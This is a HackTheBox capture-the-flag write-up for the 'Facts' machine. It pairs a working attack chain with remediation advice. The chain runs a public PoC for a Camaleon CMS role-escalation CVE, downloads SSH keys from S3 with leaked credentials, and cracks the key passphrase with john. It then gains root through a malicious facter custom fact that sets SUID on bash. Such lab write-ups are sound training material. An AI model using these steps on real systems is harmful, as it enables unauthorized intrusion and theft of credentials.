# Facts - Technical Report

> **Platform:** HackTheBox \
> **Difficulty:** `Easy` \
> **Date:** 2026-03-08 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only

---

## 0. Executive Summary

The "Facts" machine was found to contain multiple critical vulnerabilities across its web application and system configuration. An authenticated attacker with a low-privilege CMS account could exploit an insecure mass-assignment vulnerability (CVE-2025-2304) in Camaleon CMS to escalate to administrator, then leverage exposed AWS S3 credentials to access internal storage buckets containing SSH private key material. After cracking the key passphrase, SSH access was obtained as the `trivia` user. A misconfigured sudo rule granting unrestricted execution of the `facter` binary — combined with its `--custom-dir` flag — allowed arbitrary Ruby code execution as root. Immediate remediation of the role parameter handling, S3 credential exposure, SSH key passphrase strength, and sudo configuration is recommended.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"Facts"** machine on HackTheBox.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.

---

## 2. Attack Chain

```
Nmap → Camaleon CMS admin registration → CVE-2025-2304 (mass assignment role escalation)
→ CVE-2025-2304 S3 credential extraction → AWS S3 enumeration → SSH key exfiltration
→ John (passphrase crack) → SSH as trivia → sudo facter --custom-dir → custom Ruby fact → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `gobuster` | Directory enumeration |
| `burpsuite` | Request interception & analysis |
| `searchsploit` | CVE research |
| `python3 exploit.py` | CVE-2025-2304 privilege escalation PoC |
| `aws cli` | S3 bucket enumeration & file exfiltration |
| `ssh2john` | SSH private key hash extraction |
| `john` | SSH key passphrase cracking |
| `ssh` | Remote access |
| `facter` | Privilege escalation via custom fact injection |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -Pn -T4 <target-ip>
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22/tcp | SSH | OpenSSH 9.9p1 Ubuntu | Standard SSH |
| 80/tcp | HTTP | nginx 1.26.3 | Redirects to facts.htb |

**Key Observations:**
- HTTP service redirects to virtual host `facts.htb` — added to `/etc/hosts`
- Only two ports exposed — small attack surface
- Ubuntu 25.04 identified from service banners

### 4.2 Virtual Host Setup

```bash
echo "<target-ip> facts.htb" | sudo tee -a /etc/hosts
```

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Tools Used:** `gobuster`, manual inspection

**Commands:**
```bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Findings:**
- `/index.html` (200) — "Facts & Curiosities" trivia site, built on Camaleon CMS
- `/admin` (302) — redirects to `/admin/login` — CMS admin panel
- `/admin/register` (200) — publicly accessible user registration portal
- `/randomfacts/` (403) — directory exists but access restricted
- CMS theme assets confirmed Camaleon CMS via `/assets/themes/camaleon_first/`

### 5.2 Camaleon CMS Version

Version confirmed as **2.9.0** via admin panel footer after authentication:
```
Version 2.9.0
```

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** CVE-2025-2304 — Authenticated Privilege Escalation via Mass Assignment
**Location:** `POST /admin/users/<id>/updated_ajax` — Camaleon CMS 2.9.0
**Reasoning:** The `updated_ajax` controller action uses `permit!` when processing the `password` parameter, allowing all nested keys to be set without validation. By injecting `password[role]=admin` into the password update request, any authenticated user can escalate their own role to administrator.

### 6.2 Account Registration

The admin registration portal at `/admin/register` was publicly accessible. A new account was created with arbitrary credentials.

### 6.3 Exploitation — CVE-2025-2304

```bash
git clone https://github.com/Alien0ne/CVE-2025-2304
cd CVE-2025-2304
python3 exploit.py -u http://facts.htb -U <username> -P <password> -e
```

**Output:**
```
[+] Login confirmed — User ID: 5, Role: client
[+] Updated User Role: admin
[+] Extracting S3 Credentials
    s3 access key: [REDACTED]
    s3 secret key: [REDACTED]
    s3 endpoint:   http://localhost:54321
```

**Root cause:** `params.require(:password).permit!` in the controller permits all keys under `password`, including `role`.

### 6.4 S3 Credential Abuse

Using the extracted credentials to enumerate the internal MinIO S3 instance:

```bash
aws configure set aws_access_key_id [REDACTED]
aws configure set aws_secret_access_key [REDACTED]

aws s3 ls --endpoint-url http://facts.htb:54321
# internal
# randomfacts

aws s3 ls s3://internal/.ssh/ --endpoint-url http://facts.htb:54321
# authorized_keys
# id_ed25519

aws s3 cp s3://internal/.ssh/ . --recursive --endpoint-url http://facts.htb:54321
```

The `internal` bucket was a backup of a user's home directory, containing an encrypted ED25519 SSH private key.

### 6.5 SSH Key Cracking

```bash
ssh2john id_ed25519 > hash.txt
john hash.txt --wordlist=~/rockyou.txt
# [REDACTED] (id_ed25519)
```

### 6.6 SSH Access

Username identified by reasoning from the box theme ("trivia" — box is named Facts, themed around trivia):

```bash
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@<target-ip>
# passphrase: [REDACTED]
```

**Result:** User-level access obtained as `trivia`. User flag located at `/home/william/user.txt`.

**User flag:** `[REDACTED]`

---

## 7. Lateral Movement

Not applicable — went directly from `trivia` to root via privilege escalation.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `sudo -l` — trivia can run `/usr/bin/facter` as root NOPASSWD
- [x] SUID binaries — nothing unusual
- [x] `facter --help` — revealed `--custom-dir` flag for loading custom Ruby facts
- [x] Custom facts directory — `~/.facter/facts.d/` writable by trivia

**Key Findings:**
- `sudo` allows `trivia` to run `/usr/bin/facter` as any user with no password
- `facter` accepts a `--custom-dir` argument that loads arbitrary `.rb` files as facts
- `FACTERLIB` environment variable blocked by sudo, but `--custom-dir` flag is not
- Custom facts execute Ruby code in the context of the running user (root via sudo)

### 8.2 Escalation Vector

**Vector:** sudo facter with `--custom-dir` flag → arbitrary Ruby code execution as root
**Root Cause:** The sudo rule grants unrestricted execution of `facter` without restricting its command-line arguments. The `--custom-dir` flag allows loading attacker-controlled Ruby files, bypassing the `FACTERLIB` environment variable restriction.

```bash
# Step 1 — create malicious custom fact
mkdir -p ~/.facter/facts.d
cat > ~/.facter/facts.d/pwn.rb << 'EOF'
Facter.add('pwn') do
  setcode do
    `chmod +s /bin/bash`
  end
end
EOF

# Step 2 — execute as root via sudo with --custom-dir
sudo /usr/bin/facter --custom-dir ~/.facter/facts.d pwn

# Step 3 — exploit SUID bash
bash -p
whoami  # root
```

**Result:** Root shell obtained via SUID bash.

**Root flag:** `[REDACTED]`

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | CVE-2025-2304 — Mass assignment role escalation | 🔴 Critical | `POST /admin/users/<id>/updated_ajax` |
| 2 | AWS S3 credentials exposed in CMS settings | 🔴 Critical | `/admin/settings/site` |
| 3 | Internal S3 bucket exposes SSH private key | 🔴 Critical | `s3://internal/.ssh/` |
| 4 | sudo facter with unrestricted arguments | 🔴 Critical | `/etc/sudoers` |
| 5 | Weak SSH key passphrase (rockyou) | 🟠 High | `id_ed25519` |
| 6 | Public admin registration portal | 🟡 Medium | `/admin/register` |
| 7 | CMS version disclosed in page footer | 🔵 Low | `/admin/dashboard` |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- New account registrations from unexpected IPs via `/admin/register`
- PATCH requests to `/admin/users/<id>/updated_ajax` containing `password[role]` parameter
- AWS CLI requests to internal S3 endpoint from unexpected source IPs
- `ssh2john` and `john` processes on attacker machine (offline, not detectable on target)
- SSH login as `trivia` from external IP
- Creation of `~/.facter/facts.d/` directory and `.rb` files under `trivia`'s home
- `sudo /usr/bin/facter --custom-dir` execution in auth logs
- SUID bit set on `/bin/bash`

### 10.2 Security Weaknesses

- `permit!` in Rails controller allows all parameters without allowlist validation
- AWS S3 credentials stored in CMS database and exposed via admin settings page
- Internal S3 bucket contains sensitive SSH key material with no access controls
- sudo rule grants unrestricted facter execution without argument restrictions
- SSH key passphrase present in rockyou wordlist
- Admin registration portal publicly accessible

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Replace `permit!` with explicit allowlist in `updated_ajax` controller | Finding 1 |
| Immediate | Rotate exposed AWS S3 credentials | Finding 2 |
| Immediate | Remove SSH private keys from S3 bucket; restrict bucket ACLs | Finding 3 |
| Immediate | Restrict sudo facter rule with `NOEXEC` or remove entirely | Finding 4 |
| Short-term | Enforce strong passphrase policy for SSH keys | Finding 5 |
| Short-term | Disable public admin registration or require invite tokens | Finding 6 |
| Long-term | Implement secrets management (Vault, AWS Secrets Manager) for credentials | Finding 2 |
| Long-term | Regular sudo rule audits — restrict argument flags where possible | Finding 4 |

---

## 11. Lessons Learned

- **`permit!` is dangerous in Rails** — always use explicit parameter allowlists. One line of code gave any registered user full admin access.
- **Wrong VPN network = broken box** — Starting Point VPN doesn't connect to regular Labs machines. Always verify the correct VPN config before troubleshooting connectivity.
- **`--custom-dir` bypasses env var restrictions** — sudo blocking `FACTERLIB` doesn't help if the binary accepts equivalent functionality via CLI flags. Restrict the full command, not just the binary.
- **Think creatively about usernames** — the username `trivia` wasn't in any config file or hash; it came from the box theme. Context matters.
- **S3 misconfigurations cascade** — one leaked key pair unlocked an entire internal storage system containing credential material.
- **Read the CVE PoC source** — the correct parameter was `password[role]` not `user[role]`. Hours of manual Burp work vs. 30 seconds reading the exploit README.

---

*End of Report*

*Classification: Public (Redacted Version) — sensitive values redacted as this is an active HackTheBox machine*

*Full version with flags and credentials will be published after box retirement*
